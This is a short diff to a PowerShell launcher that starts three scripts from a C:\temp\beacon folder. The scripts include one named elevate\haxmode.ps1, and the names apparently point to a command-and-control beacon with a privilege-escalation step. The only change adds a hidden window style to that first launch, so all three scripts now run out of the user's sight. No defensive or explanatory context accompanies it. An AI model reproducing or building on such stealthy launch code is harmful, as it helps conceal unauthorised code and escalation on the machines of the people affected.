@@ -1,4 +1,4 @@
-Start-Process -FilePath 'powershell.exe' -ArgumentList '-command "& {C:\temp\beacon\elevate\haxmode.ps1}"'
+Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList '-command "& {C:\temp\beacon\elevate\haxmode.ps1}"'
 Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList '-command "& {C:\temp\beacon\GetState.ps1}"'
 Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList '-command "& {C:\temp\beacon\task.ps1}"'
 
